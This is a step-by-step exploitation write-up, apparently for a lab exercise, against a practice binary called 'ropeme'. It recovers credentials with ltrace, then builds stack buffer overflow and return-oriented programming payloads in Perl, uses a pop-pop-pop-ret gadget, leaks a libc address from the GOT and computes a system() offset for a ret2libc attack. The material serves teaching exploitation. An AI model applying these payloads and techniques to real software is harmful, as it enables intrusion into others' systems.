========
Write-up
========

This writeup is made on linux using radare2 tools a lot. You may want to use
another platform or tools but I won't bother supporting them.

Exercise 1
==========

Using `strings ./ropeme` we find a line "admin42". It happens to be the
username.

Exercise 2
==========

You can trace calls to library functions with ltrace. This includes strcmp:

::

    $ ltrace ./ropeme admin42
    __libc_start_main(0x8048584, 2, 0xffb970e4, 0x80485e0 <unfinished ...>
    strcmp("admin42", "admin42")                                         = 0
    puts("Enter password:"Enter password:
    )                                              = 16
    fflush(0xf7759d60)                                                   = 0
    read(0test
    , "test\n", 512)                                               = 5
    strcmp("test\n", "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227") = -1
    puts("Wrong password"Wrong password
    )                                               = 15
    +++ exited (status 1) +++


The password is "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227". To
see it without the octal notation one can use printf:

::

    $ printf "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227"
    ĳùð−÷<>[×


That explains why is didn't show up using "strings"!

Exercise 3
==========

Reading ltrace's output we can see that fgets is used to get user input
reading up to 512 chars from stdin. What happens if we really write 512
chars?

::

    $ perl -e 'print "A"x512' | ./ropeme admin42
      Segmentation fault      (core dumped) | ./ropeme admin42

Oh! This smells the buffer overflow! To know where exactly we overwrite the
instruction pointer (eip) I'll use a De Bruijn sequence (I could guess but
this is faster). This is done using radare2 tools.

Here ragg2 will generate a 500-bytes long sequence with no repetitions as
hexadecimal values, rax2 will convert it into ascii values, and we put it in
the clipboard using xclip so that we are able to paste it later.

::

    $ ragg2 -P 500 | rax2 -s - | xclip

Radare2 is then used in debug mode with rarun2 to launch the program with an
argument. We could use gdb but... well... radare2 ^^

::

    $ r2 -d rarun2 program=./ropeme arg1=admin42
        ...
     [0x7f2168f15d80]> dc
     Debugging pid = 4050, tid = 1 now
     [0xf7778b50]> dc
     Enter password:
     <paste here from clipboard>
     Wrong password
     [+] SIGNAL 11 errno=0 addr=0x41416641 code=1 ret=0
     [+] signal 11 aka SIGSEGV received 0
     [0x41416641]> woO 0x41416641
     92

Here we have the address at which it tried to return: 0x41416641
Still in radare2 we convert it into an offset to know how much padding we
need:

::

    [0x41416641]> woO 0x41416641
    92

Let's try that!

::

    $ perl -e 'print "A"x92 . "B"x4' | xclip
    $ r2 -c "dc;dc" -d rarun2 program=ropeme arg1=admin42
        ...
    Enter password:
    <paste>
    Wrong password
    [+] SIGNAL 11 errno=0 addr=0x42424242 code=1 ret=0
    [+] signal 11 aka SIGSEGV received 0
     -- Fill the bug. Fill it with love. With the creamy and hot sauce of love.
    [0x42424242]>

It works! We have taken eip! We just have to redirect it to section printing
the winning message. Let's disassemble the function checking the password:

::

    $ r2 ropeme
    [0x080483b0]> aa
    [0x080483b0]> is | grep password
    vaddr=0x080484e6 paddr=0x000004e6 ord=069 fwd=NONE sz=158 bind=GLOBAL type=FUNC name=check_password
    [0x080484e6]> pdf @ sym.check_password
    ╒ (fcn) sym.check_password 158
    │
    │
    │           0x080484e6    55             push ebp
    │           0x080484e7    89e5           mov ebp, esp
    │           0x080484e9    83ec58         sub esp, 0x58
    │           0x080484ec    83ec0c         sub esp, 0xc
    │           0x080484ef    6877860408     push str.Enter_password:
    │           0x080484f4    e887feffff     call sym.imp.puts
    │             ^- sym.imp.puts(unk)
    │           0x080484f9    83c410         add esp, 0x10
    │           0x080484fc    a150990408     mov eax, dword [obj.stdout__GLIBC_2.0]
    │           0x08048501    83ec0c         sub esp, 0xc
    │           0x08048504    50             push eax
    │           0x08048505    e866feffff     call sym.imp.fflush
    │             ^- sym.imp.fflush(unk)
    │           0x0804850a    83c410         add esp, 0x10
    │           0x0804850d    83ec04         sub esp, 4
    │           0x08048510    6800020000     push 0x200
    │           0x08048515    8d45a8         lea eax, [ebp-local_22]
    │           0x08048518    50             push eax
    │           0x08048519    6a00           push 0
    │           0x0804851b    e840feffff     call sym.imp.read
    │             ^- sym.imp.read(unk, unk, unk)
    │           0x08048520    83c410         add esp, 0x10
    │           0x08048523    85c0           test eax, eax
    │       ┌─< 0x08048525    7517           jne 0x804853e
    │       │   0x08048527    83ec0c         sub esp, 0xc
    │       │   0x0804852a    6887860408     push str.Unable_to_get_the_password
    │       │   0x0804852f    e84cfeffff     call sym.imp.puts
    │       │     ^- sym.imp.puts(unk)
    │       │   0x08048534    83c410         add esp, 0x10
    │       │   0x08048537    b801000000     mov eax, 1
    │      ┌──< 0x0804853c    eb44           jmp 0x8048582
    │      │└─> 0x0804853e    83ec08         sub esp, 8
    │      │    0x08048541    68a2860408     push str.________________
    │      │    0x08048546    8d45a8         lea eax, [ebp-local_22]
    │      │    0x08048549    50             push eax
    │      │    0x0804854a    e801feffff     call sym.imp.strcmp
    │      │      ^- sym.imp.strcmp(unk, unk)
    │      │    0x0804854f    83c410         add esp, 0x10
    │      │    0x08048552    85c0           test eax, eax
    │     ┌───< 0x08048554    7517           jne 0x804856d
    │     ││    0x08048556    83ec0c         sub esp, 0xc
    │     ││    0x08048559    68b3860408     push str.Yeah__You_win_
    │     ││    0x0804855e    e81dfeffff     call sym.imp.puts
    │     ││      ^- sym.imp.puts(unk)
    │     ││    0x08048563    83c410         add esp, 0x10
    │     ││    0x08048566    b800000000     mov eax, 0
    │    ┌────< 0x0804856b    eb15           jmp 0x8048582
    │    │└───> 0x0804856d    83ec0c         sub esp, 0xc
    │    │ │    0x08048570    68c2860408     push str.Wrong_password
    │    │ │    0x08048575    e806feffff     call sym.imp.puts
    │    │ │      ^- sym.imp.puts(unk)
    │    │ │    0x0804857a    83c410         add esp, 0x10
    │    │ │    0x0804857d    b801000000     mov eax, 1
    │    └─└──> 0x08048582    c9             leave
    ╘           0x08048583    c3             ret


Ok, so given the disassembly the key section is at 0x08048559. Let's try that:

::

    $ perl -e 'print "A"x92 . "\x59\x85\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    Yeah! You win!
    Segmentation fault (core dumped)

Finally!


Exercise 4
==========

When calling another function, the caller (say `main`) pushes the arguments
on the stack (not always, see further) and uses the call opcode that pushes
the current address on the stack for later return and then jumps to the
sub-routine location.

The sub-routine then pushes the ebp address to define its own stack frame,
takes the arguments from the stack to store them in local variables (often
pushing them back or just stocking them in registers), does its thing, then
pops the stack (the ebp address) and returns to the address at the top of the
stack (our previous return address put there by call). The instruction
pointer is incremented and the program continues.

I left away the stack allocation process besides push/pop because it isn't
very relevent here. Also there are other calling conventions besides the
stack. In x86_64, as the registers are bigger and more numerous they are the
primary way to pass arguments.

So the stack look like that before entering puts:

::

    ^ [string address]
    | [return address]

Note that as the stack is decreasing, pushing puts data at the bottom of this
diagram which is the top of the stack (facing downward). Also I represented
it without really using the opcode "call", that's why there is the return
address.

For strcmp it is similar, but note that the arguments are pushed in reverse
order:

::

    ^ [str2   address]
    | [str1   address]
    | [return address]

Exercise 5
==========

To display the password we will hijack a call to puts(). Such a call means
the stack will look somewhat like that before the call:

::

    ^ [password    address]
    | [puts return address]
    | [puts        address]
    | [padding to overflow]

The address of puts is direct:

::

    $ rabin2 -s ropeme | grep puts
    vaddr=0x08048380 paddr=0x00000380 ord=004 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts

So [puts address] is 0x08048330. In the same way we find the password address:

::

    $ rabin2 -z ropeme
    ...
    vaddr=0x080486a2 paddr=0x000006a2 ordinal=004 sz=17 len=9 section=.rodata type=ascii string=ĳùð−÷<>[×
    ...

By the way note how rabin2 isn't troubled at all by the weird password.

So far our stack is something like: "80830408XXXXXXXXa2860408". Right now the
return address isn't really important, we will return to the end of the
check_password function, just before the return statement, at address
0x0804857d.

::

    # Stack wanted:
    #
    # ^ [password    address] = 0x080486a2
    # | [puts return address] = 0x0804857d
    # | [puts        address] = 0x08048380
    # | [padding to overflow] = "A" x 92

    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\xa2\x86\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    ĳùð−÷<>[×
    Segmentation fault (core dumped)

Yeah!

Exercise 6
==========

We want to print an arbitrary message. The printing part can be done with
puts() but what about the "getting the message" part? The program provides
read(), and we can make use of it.

The read system call takes as argument a file descriptor, an address to write
to and a length. We will read from stdin (file descriptor 0). Our message
will be a traditional "Hello World!" which is of length 13 with the null
terminator.

So we need to call read, store our string somewhere, and call puts to print
it. The stack will look somewhat like:

::

    ^ [string address]
    | [end    address]
    | [string len    ]
    | [string address]
    | [stdin  fd     ]
    | [puts   address]
    | [read   address]
    | [padding       ]

However, if we do that when returning from write the argument for puts will
be stdin file descriptor! We need to find a way to clean the stack removing
the three arguments of write.

This is done using a gadget, a small but useful sequence of instructions
present at the end of a function. Here we want something to pop three
arguments off the stack. Let's use radare2 to find something like that.

::

    $ r2 ropeme
     -- Do you want to print 333.5K chars? (y/N)
    [0x08048360]> /R pop
        ...

      0x08048538             5b  pop ebx
      0x08048539             5e  pop esi
      0x0804853a             5f  pop edi
      0x0804853b             5d  pop ebp
      0x0804853c             c3  ret

        ...

Better than what we needed! We will only use the last three pops. Returning
to 0x08048539 will clear the stack of its three last elements then return
normally to the next function. I will refer to that address as pppr for
"pop pop pop ret". Our stack now looks like that:

::

    ^ [string address]
    | [end    address] = 0x0804857d
    | [puts   address] = 0x08048380
    | [string len    ] = 0x0000000e
    | [string address]
    | [stdin  fd     ] = 0x00000000
    | [pppr   address] = 0x08048539
    | [read   address] = 0x08048360
    | [padding       ] = 'A' x 92

The only thing we lack is an address to write to. We need to find a section
in memory which is more than 14 bytes large and has Read-Write permissions.
We can use radare2 for that:

::

    $ rabin2 -S ropeme | grep "perm=..rw"
    idx=17 vaddr=0x0804982c paddr=0x0000082c sz=4 vsz=4 perm=--rw- name=.init_array
    idx=18 vaddr=0x08049830 paddr=0x00000830 sz=4 vsz=4 perm=--rw- name=.fini_array
    idx=19 vaddr=0x08049834 paddr=0x00000834 sz=4 vsz=4 perm=--rw- name=.jcr
    idx=20 vaddr=0x08049838 paddr=0x00000838 sz=232 vsz=232 perm=--rw- name=.dynamic
    idx=21 vaddr=0x08049920 paddr=0x00000920 sz=4 vsz=4 perm=--rw- name=.got
    idx=22 vaddr=0x08049924 paddr=0x00000924 sz=36 vsz=36 perm=--rw- name=.got.plt
    idx=23 vaddr=0x08049948 paddr=0x00000948 sz=8 vsz=8 perm=--rw- name=.data
    idx=24 vaddr=0x08049950 paddr=0x00000950 sz=8 vsz=8 perm=--rw- name=.bss
    idx=30 vaddr=0x0804982c paddr=0x0000082c sz=292 vsz=4096 perm=m-rw- name=phdr1
    idx=31 vaddr=0x08048000 paddr=0x00000000 sz=52 vsz=52 perm=m-rw- name=ehdr

Most sections are too small... The .dynamic seems large enough to be
interesting though. We'll use it.

::

    ^ [string address] = 0x08049838
    | [end    address] = 0x0804857d
    | [puts   address] = 0x08048380
    | [string len    ] = 0x0000000e
    | [string address] = 0x08049838
    | [stdin  fd     ] = 0x00000000
    | [pppr   address] = 0x08048539
    | [read   address] = 0x08048360
    | [padding       ] = 'A' x 92

Let's try that!

::

    $ perl - <<EOF | ./ropeme admin42
    print "A" x 92
    . "\x60\x83\x04\x08"
    . "\x39\x85\x04\x08"
    . "\x00\x00\x00\x00"
    . "\x38\x98\x04\x08"
    . "\x0e\x00\x00\x00"
    . "\x80\x83\x04\x08"
    . "\x7d\x85\x04\x08"
    . "\x38\x98\x04\x08"
    EOF
    Enter password:
    [...]
    Wrong password
    Segmentation fault

Hmm... It didn't work... The reason is that the first call to read (to get
the password) reads 512 bytes from the standard input so it goes in the way
of the other call to read. The solution is to completely fill it and put our
input just after:

::
    ^ [padding       ] = 'B' x 388
    | [string address] = 0x08049838
    | [end    address] = 0x0804857d
    | [puts   address] = 0x08048380
    | [string len    ] = 0x0000000e
    | [string address] = 0x08049838
    | [stdin  fd     ] = 0x00000000
    | [pppr   address] = 0x08048539
    | [read   address] = 0x08048360
    | [padding       ] = 'A' x 92

    $ perl - <<EOF | ./ropeme admin42
    print "A" x 92
    . "\x60\x83\x04\x08"
    . "\x39\x85\x04\x08"
    . "\x00\x00\x00\x00"
    . "\x38\x98\x04\x08"
    . "\x0e\x00\x00\x00"
    . "\x80\x83\x04\x08"
    . "\x7d\x85\x04\x08"
    . "\x38\x98\x04\x08"
    . "B" x 388
    . "Hello World!\x00"
    EOF
    Enter password:
    [...]
    Wrong password
    Hello World!
    Segmentation fault

Working! That way we can chain function calls at will!

Exercise 7
==========

As strcmp comes from the libc it is dynamically loaded. That means that the
address of the real strcmp function isn't know at compile time. The jump is
made from the PLT section into the GOT section. To know at which address we
jump we just have to ask radare2:

::

    $ rabin2 -s ropeme | grep strcmp
    vaddr=0x08048350 paddr=0x00000350 ord=001 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcmp

So the strcmp address in the PLT is 0x08048310. Where does it jump after that?

::

    $ r2 -q -d -c 'dc;pd 1 @ 0x08048350' rarun2 program=ropeme arg1=admin42
        ...
    0x08048350    ff2530990408   jmp qword [rip + 0x8049930]   ; [0x10091c86:8]=-1

We now know that the jump in the GOT is done at the address 0x8049930 for
strcmp. At this address will be dynamically decided the address of the strcmp
function in the dynamically loaded libc. We can print it using our puts
payload from exercise 5:

::

    # Stack wanted:
    #
    # ^ [strcmp GOT  address] = 0x08049930
    # | [puts return address] = 0x0804857d
    # | [puts        address] = 0x08048380
    # | [padding to overflow] = "A" x 92

    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\x30\x99\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    ��c�PB]�
    Segmentation fault (core dumped)

    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\x30\x99\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    ��g�PBa�
    Segmentation fault (core dumped)

    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\x30\x99\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    ��k�PBe�
    Segmentation fault (core dumped)

The first 4 bytes of the oddly displayed line are our address. As you can see
the address changes from one call to the other. Let's use strace to see it
more clearly:

::

    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\x30\x99\x04\x08"' |\
      strace -e write ./ropeme admin42
    [ Process PID=26818 runs in 32 bit mode. ]
    write(1, "Enter password:\n", 16Enter password:
    )       = 16
    write(1, "Wrong password\n", 15Wrong password
    )        = 15
    write(1, "\260Pn\367P\362g\367\n", 9�Pn�P�g�
    )   = 9
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
    +++ killed by SIGSEGV (core dumped) +++
    Segmentation fault

    $ printf "\260Pn\367" | xxd
    0000000: b050 6ef7                                .Pn.

So our address is 0xf76e50b0 in that instance.

The reason I used strace is because if we try piping ropeme's output to
another program (xxd for example in order to get directly an hexadecimal
representation) we won't get any output. The reason is that puts() won't
write directly to the pipe, the output is bufferized. This wouldn't be a
problem normally because all output is flushed at process exit, but as we
segfault we don't benefit from it. Strace is able to see the argument when
the call occurs so before buffering, that's why it works here.

There is another solution though: flushing manually the output. To do that we
will use the fflush function. This function will take a pointer to the stdout
file structure that we don't have... Meh, let's just call it in place:

::

    # Stack wanted:
    #
    # ^ [strcmp GOT  address] = 0x08049930
    # | [flushing    address] = 0x080484fc
    # | [puts        address] = 0x08048380
    # | [padding to overflow] = "A" x 92

    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\xfc\x84\x04\x08\x30\x99\x04\x08"' |\
      ./ropeme admin42 | xxd
    00000000: 456e 7465 7220 7061 7373 776f 7264 3a0a  Enter password:.
    00000010: 5772 6f6e 6720 7061 7373 776f 7264 0ab0  Wrong password..
    00000020: 7064 f750 125e f70a                      pd.P.^..
    Segmentation fault (core dumped)

There we are.

Exercise 8
==========

This address is interesting because the offset between two libc functions
will always be the same so we can compute the offset to between strcmp and
any other function and use it to determine the address of any other function.

We'll start by computing the offset between system and strcmp in the libc.
Here I take advantage of the fact that I know that the libc that is compiled
is the same than the one used by my system, in the real world you may want to
identify the serveur running and download its standard precompiled libc for
example.

::

    $ r2 /lib/libc-2.22.so
    [0x00020730]> is | grep =system
    vaddr=0x0003f890 paddr=0x0003f890 ord=5724 fwd=NONE sz=45 bind=UNKNOWN type=FUNC name=system
    [0x00020730]> is | grep =strcmp
    vaddr=0x0007f650 paddr=0x0007f650 ord=5510 fwd=NONE sz=60 bind=GLOBAL type=LOOS name=strcmp
    [0x00020730]> ? 0x0007f650 - 0x0003f890
    261568 0x3fdc0 0776700 255.4K 3000:0dc0 261568 11000000 261568.0 0.000000f 0.000000

So the offset from strcmp to system is -0x3fdc0.

Of course having it for a paste instance is quite useless, we must now find
a way to use it without quitting the process. There are two strategies:
either we stay within the program and build the address by using ROP gadgets
astuciously, either we consider use the program as a server, have it output
the address, compute the offset outside the process and then have the process
read the new address back.
